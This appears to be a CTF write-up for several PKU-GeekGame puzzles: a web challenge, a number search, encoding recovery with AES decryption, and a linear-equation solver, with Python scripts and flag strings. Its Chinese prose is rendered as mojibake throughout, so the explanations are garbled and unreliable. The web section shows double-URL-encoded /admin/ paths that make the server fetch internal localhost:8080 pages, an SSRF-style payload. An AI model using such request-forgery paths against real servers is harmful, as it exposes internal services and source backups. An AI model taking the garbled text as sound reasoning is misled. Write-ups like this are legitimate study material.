![image-enterprise-3](./assets/enterprise-3.png)

æç¤ºè®¿é—®`/bonus`ä¸`/source_bak`

åŒç†è®¿é—®`/admin/http%253A%252F%252Flocalhost%253A8080%252Fbonus/`

![image-enterprise-4](./assets/enterprise-4.png)

è®¿é—®`/admin/http%253A%252F%252Flocalhost%253A8080%252Fsource%255Fbak/`

![image-enterprise-5](./assets/enterprise-5.png)

bonus çš„æºç æ¶‰åŠ flag3 ï¼Œä¸ä¼šåš

# è¿™ä¹Ÿèƒ½å·

## Flag Â· æ‘†

æˆä¸ºä¼šå‘˜çš„é€»è¾‘åœ¨å‰ç«¯ä»£ç `premium.js`ä¸­ï¼Œä»£ç å¾ˆé•¿ä¸”ç»è¿‡æ··æ·†ï¼Œæ— æ³•é€†å‘

`premium.html`é¡µé¢æ‰“å¼€ F12 åä¼šè‡ªåŠ¨å¼€å§‹è°ƒè¯•ï¼Œæ˜¯å‡ºé¢˜äººæœ‰æ„è®¾ç½®çš„ï¼Ÿç‚¹äº†å‡ æ¬¡åå°±èƒ½çœ‹åˆ° flag äº†ã€‚ã€‚ã€‚

![image-bai](./assets/bai.png)

ç¬¬äºŒé—®å¼€å§‹å†³å®šä¸å·äº†



# 381654729

åˆ†æä»£ç ï¼Œè¦æ±‚ flag å­—ç¬¦ä¸²çš„äºŒè¿›åˆ¶æ ¼å¼è½¬æ¢æˆå¯¹åº”çš„æ•´æ•°åä¸æŸä¸€ä¸ªæ•°å­—å¼‚æˆ–åçš„ç»“æœçš„åå…­è¿›åˆ¶å½¢å¼éœ€è¦æ»¡è¶³å‰ n ä½èƒ½å¤Ÿè¢« n æ•´é™¤

```PYTHON
import time

start = time.time()
# å½“å‰å¾ªç¯å°†è¦éå†çš„æ•°å­—åˆ—è¡¨ï¼Œåˆå§‹å€¼æ˜¯0~15ï¼Œæ³¨æ„éœ€è¦åŒ…æ‹¬0
current = list(range(0, 16))
# æ»¡è¶³æ¡ä»¶çš„ä¸‹æ¬¡è¿›è¡Œéå†çš„åˆ—è¡¨ï¼Œåˆå§‹å€¼æ˜¯ç©ºåˆ—è¡¨
next = []

# æŒ‡é’ˆä»äºŒï¼Œä¹Ÿå°±æ˜¯ç¬¬äºŒä¸ªæ•°å­—å¼€å§‹ï¼Œå› ä¸ºéå†æ—¶éœ€è¦å°†å½“å‰åˆ—è¡¨ä¸­çš„æ•°å­—ä¹˜ä»¥16
pointer = 2
# ä¼°è®¡è¯¥æ•°å­—çš„åå…­è¿›åˆ¶å½¢å¼é•¿åº¦çº¦ä¸º48
while pointer <= 48:
    # éå†currentåˆ—è¡¨ä¸­çš„åˆæ³•çš„æ•°å­—ï¼Œä¹˜ä»¥16å†åŠ ä¸Šnounceï¼Œå¦‚æœç¬¦åˆæ¡ä»¶åˆ™æ”¾å…¥nextåˆ—è¡¨
    for legal in current:
        # nounceçš„å€¼æ˜¯0~15ï¼Œä¹Ÿå°±æ˜¯ä¸‹ä¸€ä¸ªåå…­è¿›åˆ¶çš„æ•°å­—
        for nounce in list(range(0, 16)):
            test = legal*16 + nounce
            if (test % pointer == 0):
                next.append(test)
    # å› ä¸ºä¸çŸ¥é“æ•°å­—çš„é•¿åº¦æ˜¯å¤šå°‘ï¼Œå› æ­¤å¦‚æœå¾—åˆ°çš„nextæ˜¯[0]ï¼Œè¯´æ˜currentä¸­çš„æ•°å­—æ˜¯ç¬¦åˆæ¡ä»¶çš„æœ€å¤§çš„æ•°å­—
    if next == [0]:
        break
    current = next
    next = []
    pointer += 1

print(current)
for i in current:
    flag_number = i^2511413510804725280623380833250187603972342933308781842751
    flag_bytes = bytes.fromhex(hex(flag_number)[2:])
    print(flag_bytes)

print("èŠ±è´¹çš„æ—¶é—´ï¼š" + str(time.time() - start))
```

![](./assets/special-number.png)



# ä¹±ç è¿˜åŸ

ä½›å…ƒçš„`UTF8`ç¼–ç éƒ½æ˜¯ä»¥`\xe.`å¼€å¤´çš„ä¸‰ä¸ªå­—èŠ‚ï¼Œä¸”é€šè¿‡`shift_jis`è§£ç åç¬¬ä¸€ä¸ªå­—èŠ‚`\xe.`ä¸ä¼šæ¶ˆå¤±ï¼Œåªå¯èƒ½æŠ¹é™¤æ‰åé¢çš„å­—èŠ‚ã€‚è€Œåé¢çš„ä¸¤ä¸ªå­—èŠ‚éƒ½æ˜¯`\x8.`è‡³`\xb.`ï¼Œä¸”è§£ç æ—¶ä¸ä¼šæ·»åŠ æ–°çš„å­—èŠ‚

è€Œæ‰€ç»™çš„`enc`æ–‡ä»¶å†ç»è¿‡`UTF-8`è§£ç åï¼Œä¼šä»¥`\xe.`ä¸ºé«˜ä½ä»£ç†è¿›è¡Œè§£ç ï¼Œå¦‚æœåŸæ¥çš„ä¸‰ä¸ªå­—èŠ‚æ²¡æœ‰è¢«åˆ é™¤ï¼Œåˆ™èƒ½å¤ŸæˆåŠŸè§£ç åŸæ¥çš„ä½›å…ƒï¼Œå¦‚æœåŸæ¥çš„ä¸‰ä¸ªå­—èŠ‚é‡Œåé¢çš„å­—èŠ‚è¢«åˆ é™¤äº†ï¼Œåˆ™ä¼šè§£ç å¤±è´¥

æœ€ç»ˆçš„è§£å†³æ–¹æ¡ˆå°±æ˜¯è¯»å–`enc`æ–‡ä»¶åç”¨`UTF-8`è§£ç ï¼Œè§£ç å¤±è´¥çš„ä½¿ç”¨`backslashreplace`æ›¿æ¢ï¼Œç„¶åå¯¹è¿™äº›è§£ç å¤±è´¥çš„é€šè¿‡æœ‰ç­–ç•¥çš„çˆ†ç ´è¿›è¡Œæ¢å¤
æœ‰ç­–ç•¥çš„çˆ†ç ´æ˜¯æŒ‡å°è¯•æ¢å¤ broken çš„ä½›å…ƒåå†æ¬¡è¿›è¡Œ`UTF-8`ç¼–ç ä»¥åŠ`shift_jis`è§£ç ï¼Œçœ‹æ˜¯å¦ä¸æ‰€ç»™çš„`enc`æ–‡ä»¶ä»ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹çš„æŸä¸ªå­—ç¬¦ä¸²ç›¸åŒ¹é…ã€‚åŒ¹é…åå°è¯•`AES`è§£å¯†ï¼Œç”±äºæ˜¯åˆ†ç»„åŠ å¯†ï¼Œå› æ­¤ç¬¦åˆé•¿åº¦è¦æ±‚çš„åŠ å¯†ç‰‡æ®µä¹Ÿèƒ½å¤ŸæˆåŠŸè§£å¯†

æœ€ç»ˆç¡¬ç€å¤´çš®å†™å‡ºæ¥äº†è§£å¯†è„šæœ¬ï¼Œè§<a href="./ä¹±ç è¿˜åŸ/exp.py">`ä¹±ç è¿˜åŸ/exp.py`</a>ã€‚æ—¶ç©ºå¤æ‚åº¦éƒ½å¾ˆé«˜ã€‚ã€‚ã€‚è¿˜æœ‰å¾ˆå¤§ä¼˜åŒ–ç©ºé—´

![image-code-restore-1](./assets/code-restore-1.png)

![image-code-restore-2](./assets/code-restore-2.png)



# æ–¹ç¨‹ç»„

## Flag 1

åˆšå¼€å§‹ä»¥ä¸ºéœ€è¦è·å¾—ç²¾ç¡®è§£ï¼Œç„¶è€Œç”±äº`Decimal`çš„ç‰¹æ€§ä»¥åŠè®¡ç®—æœºæµ®ç‚¹æ•°çš„ç²¾åº¦é—®é¢˜æ ¹æœ¬ä¸å¯èƒ½è·å¾—ç²¾ç¡®è§£ï¼Œå› æ­¤è·å¾—å¤§è‡´è§£å³å¯ï¼Œä¸ç²¾ç¡®è§£å·®è·åº”è¯¥å¾ˆå°ï¼Œå››èˆäº”å…¥å³å¯è·å¾—ç²¾ç¡®è§£

```PYTHON
from scipy import linalg
import numpy as np
from decimal import *

getcontext().prec = 5

result = ['16404', '16416', '16512', '16515', '16557', '16791', '16844', '16394', '15927', '15942', '15896', '15433', '15469', '15553', '15547', '15507', '15615', '15548', '15557', '15677', '15802', '15770', '15914', '15957', '16049', '16163']
primes=[2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271]

p = primes[:26]
p_sqrt = []
for i in p:
    x = round(pow(i, 0.5),5)
    p_sqrt.append(x)

a = []

for i in range(26):
    a.append(p_sqrt)
    p_sqrt =  [p_sqrt[-1]] + p_sqrt[:-1]


A = np.array(a)  # Aä»£è¡¨ç³»æ•°çŸ©é˜µ
b = np.array(result)  # bä»£è¡¨å¸¸æ•°åˆ—
x = linalg.solve(A, b)

for i in x:
    print(chr(round(i)), end="")
```

å¾—åˆ°`flag{g00d_1inear_equation}`

# åè®°

é¢˜ç›®éƒ½è¶…æœ‰è¶£ï¼Œä½†æ˜¯åšå‡ºæ¥çœŸçš„ä¸å®¹æ˜“ï¼Œæˆ‘çš„ç”µè„‘å’Œæˆ‘å·²ç»æ•°æ¬¡å®•æœºäº†ğŸ˜µï¼ŒäºŒè¿›åˆ¶æ ¹æœ¬æ²¡çœ‹ã€‚

å­¦ä¹ æ–°ä¸œè¥¿çš„åŒæ—¶è¿˜èƒ½äº«å—è¢«å„ä½æ–°ç”ŸğŸ‘´è–„çº±ã€‚

å¹³å°å¾ˆå¥½çœ‹ä¹Ÿå¾ˆæµç•…ï¼Œè¿˜æœ‰å ªç§°é­”æ³•çš„é˜²ä½œå¼Šç³»ç»Ÿã€‚å¯¹`PKU-GeekGame`çš„å„ä½å·¥ä½œäººå‘˜è¡¨ç¤ºæ„Ÿè°¢ã€‚

